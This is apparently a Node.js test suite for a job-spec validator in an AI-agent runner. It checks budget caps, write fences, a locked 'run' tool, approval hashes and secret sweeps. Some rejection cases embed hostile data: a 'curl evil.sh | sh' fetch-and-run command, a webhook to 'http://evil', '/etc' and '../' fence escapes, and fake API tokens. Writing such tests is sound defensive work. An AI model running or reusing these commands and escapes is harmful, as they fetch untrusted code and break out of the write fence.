// N1 exit criteria: the job spec (the ARBITER side) is pure declarative data;
// every fit-to-pass surface reds with a pinned code+path before tokens exist.
// Reference semantics: F4's POC (poc/n1-job-schema.mjs) — 20 cases, negatives
// mutation-validated there. Cases are table-driven over inline mutators of the
// REAL job #1 spec (PRD §6): one defect per case, exactly one red — mutators
// over a shared base keep single-defect isolation without a fixture file per
// red. The two-layer checks (job fence vs workflow scope, ceiling chain) live
// here too: they need both documents.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { validateJob, jobSpecHash, checkApproval, checkMenu, CLASS_BY_CLOSE, CLOSE_TYPES, TOOL_MENU, LOCKED_TOOLS, VERDICT_TYPES, LOCKED_VERDICTS } from '../src/job.js';

// The base fixture is the PLAN shape — the only shape (PRD v1.32, 2026-07-26):
// the human signs the destination (goal / verdictType / close / checks) and the
// AGENT authors the steps. writeScope is operator law (interview decision #4);
// conditions is the environment label (decision #3, consumed at N3).
const JOB1 = {
  schema: 'job-v1',
  job: 'litectx-maintainer',
  description: 'keep litectx green: the suite is the hard close; merge stays human forever',
  provider: 'anthropic-api',
  conditions: { closeVerbosity: 'counts-only' },
  cadence: { unit: 'day', every: 1 },
  budgetUsd: 1.5,
  writeScope: ['src/**', 'test/**'],
  goal: 'Fix any failure in src/ so the suite passes.',
  verdictType: 'green',
  // the staged close (PRD v1.28): an ordered list of named stages, and the
  // agent's check menu derives from it — nobody hand-writes a ruler
  close: [{ name: 'suite-green', cmd: 'npm test', expect: 0 }],
  tools: ['read', 'grep', 'write', 'edit'],
  escalation: { mode: 'decision-ready' },
};

const clone = (o) => JSON.parse(JSON.stringify(o));
const mut = (fn) => { const j = clone(JOB1); fn(j); return j; };

test('job #1 validates green and returns the normalized spec', () => {
  const r = validateJob(JOB1);
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
  assert.deepEqual(r.job, JOB1);
});

test('clipipe-subscription is an admitted provider (F42: subscription runs viable; distinct condition key — notional vs billed cost)', () => {
  const r = validateJob(mut((j) => { j.provider = 'clipipe-subscription'; }));
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
});

test('string input single-parses; invalid JSON is a parse-error red, job null', () => {
  const ok = validateJob(JSON.stringify(JOB1));
  assert.equal(ok.ok, true);
  assert.deepEqual(ok.job, JOB1);
  const bad = validateJob('{nope');
  assert.equal(bad.ok, false);
  assert.equal(bad.reds[0].code, 'parse-error');
  assert.equal(bad.job, null);
});

test('garbage input types → parse-error red, never a throw', () => {
  for (const garbage of [42, null, true, [], undefined]) {
    const r = validateJob(garbage);
    assert.equal(r.ok, false, `${JSON.stringify(garbage)} must red`);
    assert.equal(r.reds[0].code, 'parse-error');
  }
});

// Each entry is an ATTACK or a defect: [name, mutator, 'code:path'].
// Exactly ONE red — a case that also trips a second red is a table bug, not
// tolerance ("some red somewhere" lets a wrong-reason red fake a pass, F4).
const RED_CASES = [
  // -- the arbiter split, job side --
  ['hooks (agent-domain) smuggled into the job spec', (j) => { j.hooks = { 'on-green': [{ op: 'remember' }] }; }, 'unknown-field:hooks'],
  ['loop (agent-domain) smuggled into the job spec', (j) => { j.loop = { shape: 'refine' }; }, 'unknown-field:loop'],
  ['minting claim on the close', (j) => { j.close[0].mints = true; }, 'unknown-field:close.0.mints'],
  ['retry cap is shell-owned — inexpressible here', (j) => { j.capRuns = 9; }, 'unknown-field:capRuns'],
  ['operator-authored steps[] is RETIRED and reds by name, never half-runs (PRD v1.32)', (j) => { j.steps = [{ id: 'x', close: { type: 'predicate', cmd: 'true', expect: 0 }, class: 'hard' }]; }, 'shape-retired:steps'],

  // -- fit-to-pass laundering (the close hierarchy) --
  // a close TYPE on a stage is the smuggle channel that matters: a staged close
  // is commands only, so `type` cannot ride in (one defect, one red)
  ['a close type smuggled onto a stage', (j) => { j.close[0].type = 'rubric'; }, 'unknown-field:close.0.type'],
  ['script field smuggled into a predicate close', (j) => { j.close[0].script = 'exit 0'; }, 'unknown-field:close.0.script'],
  ['gold close with a freeform comparator', (j) => { j.close = { type: 'gold', expected: '42', compare: 'my-fuzzy-match' }; }, 'invalid-value:close.compare'],

  // -- the budget hard line (ceiling chain: job <= shell) --
  ['budget above the shell cap', (j) => { j.budgetUsd = 50; }, 'bounds:budgetUsd'],
  ['zero budget', (j) => { j.budgetUsd = 0; }, 'bounds:budgetUsd'],

  // -- ungated spend --
  ['a job with no close at all', (j) => { delete j.close; }, 'missing-required:close'],
  ['missing escalation (the pain channel is not optional)', (j) => { delete j.escalation; }, 'missing-required:escalation.mode'],

  // -- the operator's write fence --
  ['writeScope missing (the fence is operator law)', (j) => { delete j.writeScope; }, 'missing-required:writeScope'],
  ['fence escaping the run dir', (j) => { j.writeScope = ['../**']; }, 'invalid-value:writeScope'],
  ['fence with a mid-path wildcard (inexpressible in enforcement, F9)', (j) => { j.writeScope = ['src/*/gen/**']; }, 'invalid-value:writeScope'],
  ['absolute fence', (j) => { j.writeScope = ['/etc/**']; }, 'invalid-value:writeScope'],
  ['whole-run-dir fence (the close lives there)', (j) => { j.writeScope = ['./**']; }, 'invalid-value:writeScope'],

  // -- the environment label (declared keys only, V3) --
  ['unknown condition key', (j) => { j.conditions.weather = 'sunny'; }, 'unknown-field:conditions.weather'],
  ['non-string condition value', (j) => { j.conditions.closeVerbosity = 42; }, 'invalid-value:conditions.closeVerbosity'],

  // -- spec hygiene --
  ['wrong schema tag', (j) => { j.schema = 'v1'; }, 'invalid-value:schema'],
  ['non-slug job name', (j) => { j.job = 'My Job!'; }, 'invalid-value:job'],
  ['unknown top-level field', (j) => { j.frequency = 'often'; }, 'unknown-field:frequency'],
  ['provider outside the menu', (j) => { j.provider = 'local-llama'; }, 'invalid-value:provider'],
  ['cadence bounds', (j) => { j.cadence.every = 0; }, 'bounds:cadence.every'],
  ['cadence not an object (one red naming cadence, not two at paths that do not exist)', (j) => { j.cadence = 'daily'; }, 'invalid-value:cadence'],
  ['cadence unit outside the menu', (j) => { j.cadence.unit = 'fortnight'; }, 'invalid-value:cadence.unit'],
  ['predicate expect not an exit code', (j) => { j.close[0].expect = 'zero'; }, 'invalid-value:close.0.expect'],
  ['quote characters in a predicate cmd (argv is whitespace-split, no shell — N2 design default)', (j) => { j.close[0].cmd = 'node -e "process.exit(0)"'; }, 'invalid-value:close.0.cmd'],

  // -- nested smuggle channels (review F1: every level reds unknown keys, not just some) --
  ['unknown field inside cadence', (j) => { j.cadence.exfil = 'x'; }, 'unknown-field:cadence.exfil'],
  ['unknown field inside escalation', (j) => { j.escalation.webhook = 'http://evil'; }, 'unknown-field:escalation.webhook'],

  // -- secrets (defense-in-depth: known literal shapes; env-only loading stays the hard line) --
  ['inline API key in the description', (j) => { j.description = 'use key sk-ant-api03-abcdefghijklmnop to auth'; }, 'secret-literal:description'],
  ['token smuggled deep in the close cmd', (j) => { j.close[0].cmd = 'GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuv npm test'; }, 'secret-literal:close.0.cmd'],
  ['secret-shaped KEY inside a check cmd (keys are swept too, release review)', (j) => { j.close[0].gapKeep = 'ghp_abcdefghijklmnopqrstuv'; }, 'secret-literal:close.0.gapKeep'],
];

for (const [name, fn, want] of RED_CASES) {
  test(`red: ${name} → ${want}`, () => {
    const r = validateJob(mut(fn));
    assert.equal(r.ok, false, 'must red');
    assert.equal(r.reds.length, 1, `exactly one red, got: ${JSON.stringify(r.reds)}`);
    assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, want);
    assert.equal(r.job, null);
  });
}

test('hyphenated words containing "sk-"/"pat_" shapes do not red (review: SECRET_RE left boundary, both hyphen depths)', () => {
  const r = validateJob(mut((j) => { j.description = 'migrate the flask-sqlalchemy-based models and task-1234567890abcdefgh queues'; }));
  assert.deepEqual(r.reds, []);
  // R2: a hyphen/underscore-delimited segment one deeper must also pass ("-sk-", not just "ask-")
  const r2 = validateJob(mut((j) => { j.description = 'run pipeline-sk-transform-utils-v2 and build_sk_widgets_frontend_v2'; }));
  assert.deepEqual(r2.reds, [], 'kebab/snake package names are not secrets');
  // ...but a REAL boundary-delimited key still reds (feat intact)
  const r3 = validateJob(mut((j) => { j.description = 'token is sk-ant-api03-abcdefghijklmnop here'; }));
  assert.equal(r3.reds[0]?.code, 'secret-literal');
});

test('the returned job is the same reference AND survives a fresh-copy comparison (review: no aliasing tautology)', () => {
  const fresh = clone(JOB1);
  const r = validateJob(JOB1);
  assert.equal(r.job, JOB1, 'reference echo is the contract');
  assert.deepEqual(r.job, fresh, 'validation must not mutate the spec');
});

test('hash follows JSON semantics: undefined keys AND toJSON objects hash like their disk round-trip (review: approval survives save/reload)', () => {
  const j = clone(JOB1);
  j.conditions = undefined;
  assert.equal(jobSpecHash(j), jobSpecHash(JSON.parse(JSON.stringify(j))));
  // R2: a toJSON-bearing value (Date) must not collapse to {} — distinct values must not collide, and must match the disk form
  const d1 = jobSpecHash({ a: new Date('2026-01-01') });
  assert.notEqual(d1, jobSpecHash({ a: new Date('1999-12-31') }), 'distinct Dates must not collide');
  assert.notEqual(d1, jobSpecHash({ a: {} }), 'a Date must not hash as an empty object');
  assert.equal(d1, jobSpecHash(JSON.parse(JSON.stringify({ a: new Date('2026-01-01') }))), 'in-memory hash equals disk round-trip');
});

test('jobSpecHash NEVER throws — the minting path (runner calls it directly) gets a hash, not a crash (review R2)', () => {
  assert.match(jobSpecHash(undefined), /^[0-9a-f]{64}$/);
  assert.match(jobSpecHash(null), /^[0-9a-f]{64}$/);
  assert.match(jobSpecHash({ a: 1n }), /^[0-9a-f]{64}$/, 'BigInt spec hashes (minting path) instead of throwing');
  const cyclic = {}; cyclic.self = cyclic;
  assert.match(jobSpecHash(cyclic), /^[0-9a-f]{64}$/, 'a cycle hashes instead of throwing');
  assert.equal(checkApproval({ a: 1n }, [{ specHash: 'x' }]), false, 'BigInt spec → false');
  assert.equal(checkApproval(undefined, [{ specHash: 'x' }]), false);
});

test('un-hashable specs never cross-approve — the sentinel hash is not an equivalence class (release review)', () => {
  const cyclic = {}; cyclic.self = cyclic;
  assert.equal(checkApproval(cyclic, [{ specHash: jobSpecHash({ a: 1n }) }]), false, 'an approval minted for one un-hashable spec must not authorize another');
  assert.equal(checkApproval(cyclic, [{ specHash: jobSpecHash(cyclic) }]), false, 'not even its own sentinel approves');
});

test('the arbiter menus are frozen — verdict-class laundering cannot be enabled by mutation (review)', () => {
  assert.ok(Object.isFrozen(CLASS_BY_CLOSE) && Object.isFrozen(CLASS_BY_CLOSE.rubric) && Object.isFrozen(CLOSE_TYPES));
  assert.throws(() => { CLASS_BY_CLOSE.rubric.push('hard'); }, TypeError);
});

test('an env REFERENCE in a close cmd does not red the secret sweep — only literals do', () => {
  // quote-free spelling: cmd runs as whitespace-split argv with no shell, so the
  // old `X="$X" npm test` form was always a misparse (and now reds on quotes)
  const r = validateJob(mut((j) => { j.close[0].cmd = 'npm test --auth-env GITHUB_TOKEN'; }));
  assert.deepEqual(r.reds, []);
});

test('the shell cap is the ceiling the shell sets (job 1.5 passes under 2, reds under 1)', () => {
  assert.equal(validateJob(JOB1, { shellCapUsd: 2 }).ok, true);
  const r = validateJob(JOB1, { shellCapUsd: 1 });
  assert.equal(r.ok, false);
  assert.equal(`${r.reds[0].code}:${r.reds[0].path}`, 'bounds:budgetUsd');
});

// ---- the arbiter split, and the two-layer fence ----
// The workflow-config half of this section went with config-v1 (PRD v1.32):
// the second layer of the fence is now the job fence vs the AGENT's plan, which
// tests/plan.test.js owns end to end (scope-escape on target, tree-changed
// scope, artifact-written path, json-valid path, and the off-menu split by
// cause). The job-side rules below are what remains here.

test('jobSpecHash is stable under key order and 64-hex', () => {
  const reordered = { escalation: JOB1.escalation, tools: JOB1.tools, close: JOB1.close, verdictType: JOB1.verdictType, goal: JOB1.goal, writeScope: JOB1.writeScope, budgetUsd: JOB1.budgetUsd, cadence: JOB1.cadence, conditions: JOB1.conditions, provider: JOB1.provider, description: JOB1.description, job: JOB1.job, schema: JOB1.schema };
  assert.equal(jobSpecHash(JOB1), jobSpecHash(reordered));
  assert.match(jobSpecHash(JOB1), /^[0-9a-f]{64}$/);
});

test('any spec change changes the hash (approval binds to the exact version)', () => {
  assert.notEqual(jobSpecHash(JOB1), jobSpecHash(mut((j) => { j.budgetUsd = 1.4; })));
  assert.notEqual(jobSpecHash(JOB1), jobSpecHash(mut((j) => { j.close[0].cmd = 'npm test --silent'; })));
});

// MED-1: `tools` is OPTIONAL, and its absence means the full TOOL_MENU — which
// this branch widened 6→14 verbs. An omitted-`tools` spec therefore kept a
// byte-identical (and hash-identical) signature while its runtime ceiling grew
// by eight verbs. The hash is taken over the RESOLVED spec so it pins WHICH menu
// was signed; any future menu change flips it into the existing refuse-until-
// reapproved machinery.
test('an omitted `tools` hashes as the RESOLVED full menu — widening the menu flips the hash (MED-1)', () => {
  const { tools: _explicit, ...noTools } = JOB1;
  assert.equal(jobSpecHash(noTools), jobSpecHash({ ...noTools, tools: [...TOOL_MENU] }),
    'omitting tools IS declaring the full menu (plan.js/planrun.js resolve it exactly so) — the hash must say which one');
  assert.notEqual(jobSpecHash(noTools), jobSpecHash({ ...noTools, tools: ['read', 'grep', 'write', 'edit', 'recall', 'get'] }),
    'the pre-widening 6-verb menu is a DIFFERENT signed ceiling: same spec bytes, different meaning, different hash');
  // checkApproval recomputes the hash itself rather than calling jobSpecHash —
  // the resolution has to hold there too, or the gate and the signer disagree
  assert.equal(checkApproval(noTools, [{ specHash: jobSpecHash({ ...noTools, tools: [...TOOL_MENU] }), signer: 'hamr', ts: 'now' }]), true,
    'the approval gate reads the same resolved form the signer minted');
});

test('a spec that NAMED its ceiling is untouched by the resolution — no migration for explicit `tools` (MED-1)', () => {
  // literal pinned from the pre-fix code: an explicit-`tools` spec's signature
  // must survive the change, so no signed job in flight silently unapproves
  assert.equal(jobSpecHash(JOB1), '83627686b0fe8aec585bef4f06f563c6f46ba519d77a1d7ca62ccc438997f4ae');
  assert.equal(checkApproval(JOB1, [{ specHash: '83627686b0fe8aec585bef4f06f563c6f46ba519d77a1d7ca62ccc438997f4ae', signer: 'hamr', ts: 'now' }]), true);
});

test('checkApproval: matching record approves; stale hash, empty, or garbage never do — and never throw', () => {
  const signed = [{ specHash: jobSpecHash(JOB1), signer: 'hamr', ts: '2026-07-12T00:00:00Z' }];
  assert.equal(checkApproval(JOB1, signed), true);
  assert.equal(checkApproval(mut((j) => { j.budgetUsd = 1.4; }), signed), false, 'edited spec must re-approve');
  assert.equal(checkApproval(JOB1, []), false);
  for (const garbage of [undefined, null, 42, 'yes', [{}], [{ specHash: 7 }]]) {
    assert.equal(checkApproval(JOB1, garbage), false, `${JSON.stringify(garbage)} must not approve`);
  }
});




test('TOOL_MENU ships frozen: the P four-component catalog — run is NOT in the menu', () => {
  assert.deepEqual([...TOOL_MENU], ['read', 'grep', 'write', 'edit', 'recall', 'get', 'impact', 'related', 'recent', 'compress', 'peek', 'stash', 'remember', 'forget']);
  assert.ok(Object.isFrozen(TOOL_MENU));
  // The line the menu exists to hold (F19): admitting retrieval must NOT admit execution.
  // A worker that can run commands can run its own close — it grades its own exam.
  // `edit` (BA-13) is a WRITE-class verb bounded by the same fence as write — it
  // admits no execution either.
  assert.ok(!TOOL_MENU.includes('run'), 'run stays locked — retrieval is read-only, not a foot in the door');
  assert.deepEqual([...LOCKED_TOOLS], ['run']);
});




test('close.cmd leading/trailing whitespace reds — argv splits on whitespace; honest refusal beats a silent misparse', () => {
  for (const cmd of [' npm test', 'npm test ', '\tnpm test']) {
    const r = validateJob(mut((x) => { x.close[0].cmd = cmd; }));
    assert.equal(r.ok, false, `${JSON.stringify(cmd)} must red`);
    assert.ok(r.reds.some((d) => d.code === 'invalid-value' && d.path === 'close.0.cmd'),
      `${JSON.stringify(cmd)}: expected invalid-value@close.cmd, got ${JSON.stringify(r.reds)}`);
  }
});

test('a close may declare how it evidences judgment — pattern + floor', () => {
  const j = mut((s) => { s.close[0].judged = { pattern: '^tests (\\d+)$', min: 300 }; });
  const r = validateJob(j);
  assert.deepEqual(r.reds, []);
  assert.equal(r.job.close[0].judged.min, 300);
});

test('judged is OPTIONAL — a close with no countable output (a linter, a hitl) stays writable', () => {
  assert.equal(validateJob(JOB1).ok, true, 'job #1 declares no judged block and must still validate');
});

test('a judged pattern with no capture group reds — it would crash EVERY close, forever', () => {
  const j = mut((s) => { s.close[0].judged = { pattern: '^tests \\d+$', min: 3 }; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.path === 'close.0.judged.pattern' && /capture group/.test(x.detail)),
    'the count is read from group 1 — a pattern that captures nothing is a dead arbiter');
});

test('a judged pattern with MORE than one capture group reds — runClose reads group 1 only', () => {
  // alternation whose branches carry the count in different groups: group 1 is
  // undefined whenever the second branch matches, so Number(undefined) is NaN,
  // judgedCount lands null, and an exit-0 GREEN is stamped 'crashed' (review
  // 2026-07-18). The validator's own message already promised ONE group; it
  // only ever enforced "not zero". Red the spec, not every run.
  const j = mut((s) => { s.close[0].judged = { pattern: '(?:tests (\\d+)|passed: (\\d+))', min: 3 }; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.path === 'close.0.judged.pattern' && /one capture group/.test(x.detail)),
    'two capture groups is a fake-crash generator, not a valid count pattern');
});

test('alternation stays expressible with ONE capture group around non-capturing branches', () => {
  const j = mut((s) => { s.close[0].judged = { pattern: '(?:tests|passed:) (\\d+)', min: 3 }; });
  assert.deepEqual(validateJob(j).reds, []);
});

test('a judged pattern that does not compile reds at validation, not at run time', () => {
  const j = mut((s) => { s.close[0].judged = { pattern: '^tests ((\\d+$', min: 3 }; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.path === 'close.0.judged.pattern' && /RegExp/.test(x.detail)));
});

test('a judgment floor of 0 reds — it is satisfied by judging nothing, which is the check itself', () => {
  const j = mut((s) => { s.close[0].judged = { pattern: '^tests (\\d+)$', min: 0 }; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.path === 'close.0.judged.min'));
});

test('unknown fields inside judged red (a script body cannot smuggle in through it)', () => {
  const j = mut((s) => { s.close[0].judged = { pattern: '^tests (\\d+)$', min: 3, cmd: 'curl evil.sh | sh' }; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'close.0.judged.cmd'));
});

test('judged is inexpressible on a hitl close — a human IS the judgment, there is nothing to count', () => {
  const j = mut((s) => { s.verdictType = 'hitl'; s.close = { type: 'hitl', prompt: 'review?', judged: { pattern: '^tests (\\d+)$', min: 3 } }; delete s.checks; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'close.judged'));
});

test('a close may declare gapKeep — a regex source whose matching lines survive the gap bound (F28)', () => {
  const j = mut((s) => { s.close[0].gapKeep = '^not ok'; });
  const r = validateJob(j);
  assert.deepEqual(r.reds, []);
  assert.equal(r.job.close[0].gapKeep, '^not ok');
});

test('gapKeep is OPTIONAL — a close without it validates and keeps exactly today\'s bound', () => {
  assert.equal(validateJob(JOB1).ok, true, 'job #1 declares no gapKeep and must still validate');
});

test('a gapKeep that does not compile reds at validation, not at run time (mirrors judged.pattern)', () => {
  const j = mut((s) => { s.close[0].gapKeep = '^not ok ('; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.path === 'close.0.gapKeep' && /RegExp/.test(x.detail)),
    'reds-before-tokens: an invalid keep pattern is a spec red, never a runtime crash');
});

test('an empty or non-string gapKeep reds — it is a regex SOURCE, not an object or blank', () => {
  for (const bad of ['', { pattern: 'x' }, 3]) {
    const r = validateJob(mut((s) => { s.close[0].gapKeep = bad; }));
    assert.equal(r.ok, false, `${JSON.stringify(bad)} must red`);
    assert.ok(r.reds.some((x) => x.path === 'close.0.gapKeep'));
  }
});

test('gapKeep is inexpressible on a hitl close — a human close renders no stream to keep lines from', () => {
  const j = mut((s) => { s.verdictType = 'hitl'; s.close = { type: 'hitl', prompt: 'review?', gapKeep: '^not ok' }; delete s.checks; });
  const r = validateJob(j);
  assert.equal(r.ok, false);
  assert.ok(r.reds.some((x) => x.code === 'unknown-field' && x.path === 'close.gapKeep'));
});

// A second real plan-shape spec (job #4, TESTGEN): the base fixture above is a
// one-check job, this one carries two checks and the full tool ceiling.
const JOB4 = {
  schema: 'job-v1',
  job: 'aurora-testgen',
  description: 'write a pytest suite for the untested orchestrator; mutation kill-rate is the close; the agent authors the step plan',
  provider: 'anthropic-api',
  cadence: { unit: 'week', every: 1 },
  budgetUsd: 1.8,
  writeScope: ['tests/**'],
  goal: 'Write a pytest suite for src/aurora/agent/orchestrator.py that kills at least 45% of the frozen mutant set.',
  verdictType: 'green',
  close: [
    { name: 'clean-run', cmd: 'python -m pytest -ra tests/test_orchestrator.py', expect: 0, gapKeep: '^FAILED' },
    { name: 'form-floor', cmd: 'python check_form.py', expect: 0, judged: { pattern: 'collected (\\d+) items', min: 5 } },
    { name: 'verdict', cmd: 'python grade.py', expect: 0 },
  ],
  tools: ['read', 'grep', 'write', 'edit', 'recall', 'get'],
  escalation: { mode: 'decision-ready' },
};
const mut4 = (fn) => { const j = clone(JOB4); fn(j); return j; };

test('the four-field plan shape validates green and returns the spec', () => {
  const r = validateJob(JOB4);
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
  assert.deepEqual(r.job, JOB4);
});

test('tools is optional in the plan shape (the ceiling defaults to the full menu)', () => {
  const r = validateJob(mut4((j) => { delete j.tools; }));
  assert.deepEqual(r.reds, []);
});

test('VERDICT_TYPES ships frozen: green admitted, soft-green/hitl declared-but-locked', () => {
  assert.deepEqual([...VERDICT_TYPES], ['green', 'soft-green', 'hitl']);
  assert.ok(Object.isFrozen(VERDICT_TYPES));
  assert.deepEqual([...LOCKED_VERDICTS], ['soft-green', 'hitl']);
  assert.ok(Object.isFrozen(LOCKED_VERDICTS));
});

test('a locked verdictType is a request-red with the type as a STRUCTURED verb field (admission demand, the ledger keys on it)', () => {
  for (const vt of ['soft-green', 'hitl']) {
    const close = vt === 'hitl'
      ? { type: 'hitl', prompt: 'review the draft?' }
      : { type: 'rubric', criteria: 'summary reads well' };
    const r = validateJob(mut4((j) => { j.verdictType = vt; j.close = close; }));
    assert.equal(r.ok, false, `${vt} must red`);
    assert.equal(r.reds.length, 1, `exactly one red, got ${JSON.stringify(r.reds)}`);
    const red = r.reds[0];
    assert.equal(`${red.code}:${red.path}`, 'request-red:verdictType');
    assert.equal(red.verb, vt, 'the declared type rides the red as a structured field');
    assert.match(red.detail ?? '', /not at this rung/);
  }
});

test('request-red carries the LIB stamped at the emit site: a locked verdict is bareloop territory, a locked tool is bare-agent\'s', () => {
  // one code, two catalogues. The ledger keys attribution on this field, so
  // getting it wrong files a bareloop-catalogue refusal as an upstream bug
  // against bare-agent (the BA-2 misattribution class).
  for (const vt of LOCKED_VERDICTS) {
    const close = vt === 'hitl'
      ? { type: 'hitl', prompt: 'review the draft?' }
      : { type: 'rubric', criteria: 'summary reads well' };
    const r = validateJob(mut4((j) => { j.verdictType = vt; j.close = close; }));
    const red = r.reds.find((x) => x.code === 'request-red' && x.path === 'verdictType');
    assert.equal(red.lib, 'bareloop', `${vt} is OUR catalogue refusing, never an upstream gap`);
  }
  const t = validateJob(mut4((j) => { j.tools = ['read', ...LOCKED_TOOLS]; }));
  const toolRed = t.reds.find((x) => x.code === 'request-red' && x.path === 'tools');
  assert.equal(toolRed.verb, LOCKED_TOOLS[0]);
  assert.equal(toolRed.lib, 'bare-agent', 'a locked TOOL verb is demand against the worker-surface package');
});

test('plan-shape spec edits change the hash (a check edit is a new spec version)', () => {
  assert.notEqual(jobSpecHash(JOB4), jobSpecHash(mut4((j) => { j.close[0].cmd = 'python -m pytest -q'; })));
});




test('maxWallMs is OPTIONAL and has no default: a spec without it validates green and the field stays absent (never a silent fallback)', () => {
  const j = clone(JOB1);
  delete j.maxWallMs;
  const r = validateJob(j);
  assert.deepEqual(r.reds, []);
  assert.equal(r.job.maxWallMs, undefined, 'validateJob must NOT mint a default — F45: a defaulted cap is a silent second ceiling');
  assert.ok(!Object.prototype.hasOwnProperty.call(r.job, 'maxWallMs'), 'the absence is absence, not a zero or null');
});

test('maxWallMs accepts a positive integer of milliseconds', () => {
  const r = validateJob({ ...clone(JOB1), maxWallMs: 45 * 60_000 });
  assert.deepEqual(r.reds, []);
  assert.equal(r.job.maxWallMs, 2_700_000);
});

test('maxWallMs below one close timeout is a bounds red: addendum 1 measured enforcement as maxWallMs + closeTimeoutMs, so a budget under that cannot fund its own close', () => {
  const r = validateJob({ ...clone(JOB1), maxWallMs: 5_000 });
  assert.equal(r.ok, false);
  const red = r.reds.find((x) => x.path === 'maxWallMs');
  assert.equal(red.code, 'bounds');
  assert.match(red.detail, /close/i, 'the red must say WHY, not just "out of range"');
});

// ---- P: the widened catalog at the spec ceiling (design record 2026-07-28) ----

test('P: the full catalog is grantable at the spec ceiling', () => {
  const r = validateJob(mut4((j) => { j.tools = ['read', 'grep', 'write', 'edit', 'recall', 'get', 'impact', 'related', 'recent', 'compress', 'peek', 'stash', 'remember', 'forget']; }));
  assert.deepEqual(r.reds, []);
  assert.equal(r.ok, true);
});

test('P: a store-only ceiling is still scout-blind — isolate verbs are not read-capable', () => {
  // stash/remember/forget write the store; a ceiling of only those plus write-class
  // leaves the scout with an empty read menu, the exact degradation the rule catches
  const r = validateJob(mut4((j) => { j.tools = ['write', 'stash', 'remember']; }));
  assert.ok(r.reds.some((x) => /read-capable/.test(x.detail ?? '')), JSON.stringify(r.reds));
});

test('P: run stays locked-but-listed — the widening never touched the lock', () => {
  const r = validateJob(mut4((j) => { j.tools = ['read', 'impact', 'run']; }));
  assert.ok(r.reds.some((x) => x.code === 'request-red' && x.verb === 'run'));
});

// ---- checkMenu: the derived chain (PRD v1.28) ----
// A picked ruler runs its prerequisites first. The expansion must be
// TRANSITIVE: a one-level expansion runs an INCOMPLETE chain, so a stage whose
// prerequisite has its own prerequisite false-reds for a reason that has
// nothing to do with the worker's edit — the exact failure `needs` exists to
// remove, one level deeper. Zero reachability today (no signed spec nests),
// so these pin the shape before a spec can reach it.

test('checkMenu expands needs TRANSITIVELY: a two-deep chain runs all of it, in close order', () => {
  const close = [
    { name: 'seed', cmd: 'git rev-parse SEED', expect: 0, offer: false },
    { name: 'build', cmd: 'npm run build', expect: 0 },
    { name: 'declarations', cmd: 'npm run build:types', expect: 0, needs: ['build'] },
    { name: 'api-superset', cmd: 'node check-api.mjs', expect: 0, needs: ['declarations'] },
  ];
  const menu = checkMenu(close);
  assert.deepEqual(menu.find((m) => m.name === 'api-superset').run.map((s) => s.name),
    ['build', 'declarations', 'api-superset'],
    'needs-of-needs runs too — an incomplete chain reds on missing declarations, not on the work');
  assert.deepEqual(menu.find((m) => m.name === 'declarations').run.map((s) => s.name), ['build', 'declarations']);
  assert.deepEqual(menu.find((m) => m.name === 'build').run.map((s) => s.name), ['build']);
});

test('checkMenu dedupes a diamond and keeps close-stage order, never the mention order', () => {
  const close = [
    { name: 'build', cmd: 'npm run build', expect: 0 },
    { name: 'left', cmd: 'node left.mjs', expect: 0, needs: ['build'] },
    { name: 'right', cmd: 'node right.mjs', expect: 0, needs: ['build'] },
    // names its prerequisites out of close order: the chain is the CLOSE's
    // order (which the validator already forces to be topological), not the
    // operator's typing order
    { name: 'both', cmd: 'node both.mjs', expect: 0, needs: ['right', 'left'] },
  ];
  const run = checkMenu(close).find((m) => m.name === 'both').run.map((s) => s.name);
  assert.deepEqual(run, ['build', 'left', 'right', 'both'], 'build runs ONCE, and the chain follows the close');
});

test('checkMenu refuses to loop on a needs CYCLE — terminates, each stage at most once', () => {
  // Unreachable through validateJob (needs must name EARLIER stages, so a cycle
  // is inexpressible in a signed close) — but checkMenu is exported and pure,
  // and a fixed-point walk that trusts its input is one hostile close away from
  // hanging the runner before any token burns.
  const close = [
    { name: 'a', cmd: 'node a.mjs', expect: 0, needs: ['b'] },
    { name: 'b', cmd: 'node b.mjs', expect: 0, needs: ['a'] },
  ];
  const menu = checkMenu(close);
  for (const m of menu) {
    const names = m.run.map((s) => s.name);
    assert.equal(new Set(names).size, names.length, `${m.name}: a stage appears at most once`);
    assert.equal(names[names.length - 1], m.name, 'the picked stage still runs last');
  }
  assert.deepEqual(menu.map((m) => m.run.map((s) => s.name)), [['b', 'a'], ['a', 'b']], 'deterministic, both directions');
});
